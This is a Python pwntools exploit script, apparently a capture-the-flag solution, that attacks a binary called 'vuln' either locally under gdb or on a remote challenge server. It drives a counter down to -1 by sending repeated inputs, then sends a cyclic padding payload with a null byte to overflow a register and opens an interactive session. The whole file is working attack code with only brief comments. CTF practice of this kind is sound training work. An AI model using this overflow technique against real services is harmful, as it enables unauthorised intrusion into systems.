#!/usr/bin/env python2
from pwn import *

elf = ELF('./vuln')
local = True
GDBSCPT = '''
b* main
b* check+512
'''
if local:
    conn = elf.process()
    gdb.attach(conn, gdbscript=GDBSCPT)
else :
    host = 'zero.hackini24.shellmates.club'
    port = 443
    conn = remote(host,port)

# overflow the impossible variable until it become -1
for i in range(255):
    conn.sendline("1")

# enter check function
conn.sendline("2")

# send 127 of chunks and 1 null byte to overflow eax
payload = flat(
    0x0,
    "aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab"
)
conn.sendline(payload)
conn.interactive()


conn.close()
